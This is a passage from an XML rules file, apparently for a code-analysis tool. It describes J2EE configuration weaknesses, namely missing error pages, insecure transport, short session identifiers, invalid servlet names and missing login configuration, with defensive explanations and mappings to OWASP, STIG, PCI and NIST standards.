		<internalKey>Environment/J2EE Misconfiguration/Incomplete Error
			Handling
		</internalKey>
		<name>J2EE Misconfiguration: Incomplete Error Handling</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A web application must define default error pages in order to prevent attackers from mining information from the application container's built-in error response.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When an attacker explores a web site looking for vulnerabilities, the amount of information that the site provides is crucial to the eventual success or failure of any attempted attacks. If the application shows the attacker a stack trace, it relinquishes information that makes the attacker's job significantly easier. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.<br><br>The application configuration should specify a default error page in order to guarantee that the application will never leak error messages to an attacker. Handling standard HTTP error codes is useful and user-friendly in addition to being a good security practice, and a good configuration will also define a last-chance error handler that catches any exception that could possibly be thrown by the application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 7</em> <br></p>
																									   <p>[11] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_incomplete_error_handling____404
		</key>
		<internalKey>Environment/J2EE Misconfiguration/Incomplete Error
			Handling - (404)
		</internalKey>
		<name>J2EE Misconfiguration: Incomplete Error Handling - (404)</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A web application must define a default error page for 404 errors to prevent attackers from mining information from the application container's built-in error response.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When an attacker explores a web site looking for vulnerabilities, the amount of information that the site provides is crucial to the eventual success or failure of any attempted attacks. If the application shows the attacker a stack trace, it relinquishes information that makes the attacker's job significantly easier. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.<br><br>The application configuration should specify a default error page in order to guarantee that the application will never leak error messages to an attacker. Handling standard HTTP error codes is useful and user-friendly in addition to being a good security practice, and a good configuration will also define a last-chance error handler that catches any exception that could possibly be thrown by the application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 7</em> <br></p>
																									   <p>[11] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_incomplete_error_handling____500
		</key>
		<internalKey>Environment/J2EE Misconfiguration/Incomplete Error
			Handling - (500)
		</internalKey>
		<name>J2EE Misconfiguration: Incomplete Error Handling - (500)</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A web application must define a default error page for 500 errors to prevent attackers from mining information from the application container's built-in error response.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When an attacker explores a web site looking for vulnerabilities, the amount of information that the site provides is crucial to the eventual success or failure of any attempted attacks. If the application shows the attacker a stack trace, it relinquishes information that makes the attacker's job significantly easier. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.<br><br>The application configuration should specify a default error page in order to guarantee that the application will never leak error messages to an attacker. Handling standard HTTP error codes is useful and user-friendly in addition to being a good security practice, and a good configuration will also define a last-chance error handler that catches any exception that could possibly be thrown by the application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 7</em> <br></p>
																									   <p>[11] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_incomplete_error_handling____throwable
		</key>
		<internalKey>Environment/J2EE Misconfiguration/Incomplete Error
			Handling - (throwable)
		</internalKey>
		<name>J2EE Misconfiguration: Incomplete Error Handling - (throwable)
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A web application must define a default error page for <code>java.lang.Throwable</code> to handle any uncaught exceptions in order to prevent attackers from mining information from the application container's built-in error response.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When an attacker explores a web site looking for vulnerabilities, the amount of information that the site provides is crucial to the eventual success or failure of any attempted attacks. If the application shows the attacker a stack trace, it relinquishes information that makes the attacker's job significantly easier. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.<br><br>The application configuration should specify a default error page in order to guarantee that the application will never leak error messages to an attacker. Handling standard HTTP error codes is useful and user-friendly in addition to being a good security practice, and a good configuration will also define a last-chance error handler that catches any exception that could possibly be thrown by the application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 7</em> <br></p>
																									   <p>[11] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_insecure_transport</key>
		<internalKey>Environment/J2EE Misconfiguration/Insecure Transport
		</internalKey>
		<name>J2EE Misconfiguration: Insecure Transport</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application configuration should ensure that SSL is used for all access controlled pages.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If an application uses SSL to guarantee confidential communication with client browsers, the application configuration should make it impossible to view any access controlled page without SSL.<br><br>There are three common ways for SSL to be bypassed:<br><br>- A user manually enters URL and types "HTTP" rather than "HTTPS".<br><br>- Attackers intentionally send a user to an insecure URL.<br><br>- A programmer erroneously creates a relative link to a page in the application, failing to switch from HTTP to HTTPS. (This is particularly easy to do when the link moves between public and secured areas on a web site.)
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 5</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] A. Taylor et al. <em>J2EE & Java: Developing Secure Web Applications with Java Technology (Hacking Exposed)</em> Osborne/McGraw-Hill<br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_insufficient_session_id_length
		</key>
		<internalKey>Environment/J2EE Misconfiguration/Insufficient Session-ID
			Length
		</internalKey>
		<name>J2EE Misconfiguration: Insufficient Session-ID Length</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Session identifiers should be at least 128 bits long to prevent brute-force session guessing attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The WebLogic deployment descriptor should specify a session identifier length of at least 24 bytes. A shorter session identifier leaves the application open to brute-force session guessing attacks. If an attacker can guess an authenticated user's session identifier, he can take over the user's session. The remainder of this explanation will detail a back-of-the-envelope justification for a 24-byte session identifier.<br><br>The session identifier is composed of a pseudo-random selection of the 62 alpha-numeric characters, which means that if the string were composed in a truly random fashion each byte could yield a maximum of 6 bits of entropy.<br><br>The expected number of seconds required to guess a valid session identifier is given by the equation:<br><br>(2^B+1) / (2*A*S)<br><br>Where:<br><br>- B is the number of bits of entropy in the session identifier.<br><br>- A is the number of guesses an attacker can try each second.<br><br>- S is the number of valid session identifiers that are valid and available to be guessed at any given time.<br><br>The number of bits of entropy in the session identifier is always less than the total number of bits in the session identifier. For example, if session identifiers were provided in ascending order, there would be close to zero bits of entropy in the session identifier no matter the identifier's length. Assuming that the session identifiers are being generated using a good source of random numbers, we will estimate the number of bits of entropy in a session identifier to be half the total number of bits in the session identifier. For realistic identifier lengths this is possible, though perhaps optimistic.<br><br>If attackers use a botnet with hundreds or thousands of drone computers, it is reasonable to assume that they could attempt tens of thousands of guesses per second. If the web site in question is large and popular, a high volume of guessing might go unnoticed for some time.<br><br>A lower bound on the number of valid session identifiers that are available to be guessed is the number of users that are active on a site at any given moment. However, any users that abandon their sessions without logging out will increase this number. (This is one of many good reasons to have a short inactive session timeout.)<br><br>With a 64 bit session identifier, assume 32 bits of entropy. For a large web site, assume that the attacker can try 1,000 guesses per second and that there are 10,000 valid session identifiers at any given moment. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is less than 4 minutes.<br><br>Now assume a 128 bit session identifier that provides 64 bits of entropy. With a very large web site, an attacker might try 10,000 guesses per second with 100,000 valid session identifiers available to be guessed. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is greater than 292 years.<br><br>Working backwards from bits to bytes, now, the session identifier must be 128/6, which yields approximately 21 bytes. Furthermore, empirical testing has demonstrated that the first three bytes of the session identifier do not appear to be randomly generated, which means to achieve our desired 64 bits of entropy we need to configure WebLogic to use a session identifier 24 bytes in length.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3090 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3405 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3405 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3405 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3405 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 6</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M9 Improper Session Handling</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_invalid_servlet_name</key>
		<internalKey>Environment/J2EE Misconfiguration/Invalid Servlet Name
		</internalKey>
		<name>J2EE Misconfiguration: Invalid Servlet Name</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An invalid servlet name can prevent legitimate access to the intended Servlet.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A missing or duplicate servlet name in <code>web.xml</code> is an error. Every Servlet should have a unique name (<code>servlet-name</code>) and a corresponding mapping (<code>servlet-mapping</code>).<br><br><br><br><b>Example 1:</b> The following entry from <code>web.xml</code> shows several erroneous servlet definitions.<br><pre><br>&lt;!-- No &lt;servlet-name&gt; specified: --&gt;<br>    &lt;servlet&gt;<br>        &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;<br>        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;<br>    &lt;/servlet&gt;<br><br>&lt;!-- Empty &lt;servlet-name&gt; node: --&gt;<br>    &lt;servlet&gt;<br>        &lt;servlet-name/&gt;<br>        &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;<br>        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;<br>    &lt;/servlet&gt;<br><br>&lt;!-- Duplicate &lt;servlet-name&gt; nodes: --&gt;<br>    &lt;servlet&gt;<br>        &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;<br>        &lt;servlet-name&gt;Servlet&lt;/servlet-name&gt;<br>        &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;<br>        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;<br>    &lt;/servlet&gt;<br></pre><br>These errors may cause an unintentional denial of access to the Servlet.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[9] Sun Microsystems, Inc. <em>Java Servlet Specification 2.4</em> <br></p>
																									   <p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_missing_authentication_method
		</key>
		<internalKey>Environment/J2EE Misconfiguration/Missing Authentication
			Method
		</internalKey>
		<name>J2EE Misconfiguration: Missing Authentication Method</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Security and authorization constraints will fail without a login configuration.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The <code>&lt;login-config&gt;</code> element is used to configure how users authenticate to an application. A missing authentication method means the application does not know how to apply authorization constraints since no one can log in. The authentication method is specified using the <code>&lt;auth-method&gt;</code> tag, which is a child of <code>&lt;login-config&gt;</code>.<br><br>There are four authentication methods: <code>BASIC</code>, <code>FORM</code>, <code>DIGEST</code>, and <code>CLIENT_CERT</code>.<br><br><code>BASIC</code> denotes HTTP Basic authentication.<br><code>FORM</code> denotes Form-based authentication.<br><code>DIGEST</code> is like BASIC authentication; however, in DIGEST the password is encrypted.<br><code>CLIENT_CERT</code> requires that clients have Public Key Certificates and use SSL/TLS.<br><br><br><br><b>Example 1:</b> The following configuration does not specify a login configuration.<br><pre><br>&lt;web-app&gt;<br><br>    &lt;!-- servlet declarations --&gt;<br>    &lt;servlet&gt;...&lt;/servlet&gt;<br><br>    &lt;!-- servlet mappings--&gt;<br>    &lt;servlet-mapping&gt;...&lt;/servlet-mapping&gt;<br><br>    &lt;!-- security-constraints--&gt;<br>    &lt;security-constraint&gt;...&lt;/security-constraint&gt;<br><br>    &lt;!-- login-config goes here --&gt;<br><br>    &lt;!-- security-roles --&gt;<br>    &lt;security-role&gt;...&lt;/security-role&gt;<br><br>&lt;/web-app&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[10] Sun Microsystems, Inc. <em>Java Servlet Specification 2.4</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>
																									   <p>[14] Sun Microsystems, Inc. <em>Specifying an Authentication Mechanism</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
